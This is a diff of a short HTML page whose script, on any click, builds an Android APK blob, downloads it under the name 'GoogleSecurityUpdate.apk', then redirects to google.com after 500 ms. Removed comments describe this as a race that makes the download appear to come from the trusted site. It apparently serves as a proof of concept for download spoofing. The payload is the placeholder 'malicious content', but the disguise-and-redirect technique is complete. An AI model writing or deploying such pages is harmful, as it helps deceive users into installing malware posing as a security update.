@@ -5,21 +5,23 @@
 </head>
 <body>
 <h1>Click anywhere</h1>
-  
+
 <script>
 document.addEventListener('click', () => {
-    // Trigger download dialog Android
-    const blob = new Blob(['malicious content'], {type: 'application/vnd.android.package-archive'});
+    const blob = new Blob(
+        ['malicious content'], 
+        {type: 'application/vnd.android.package-archive'}
+    );
+    const url = URL.createObjectURL(blob);
+    
     const a = document.createElement('a');
-  
     a.href = url;
     a.download = 'GoogleSecurityUpdate.apk';
     a.click();
     
-    // Race: navigate after dialog appears
     setTimeout(() => {
-        window.location.href = 'https://www.microsoft.com';
-    }, 500);  // Android perlu lebih cepat karena download langsung ke notif bar
+        window.location.href = 'https://google.com';
+    }, 500);
 });
 </script>
 </body>
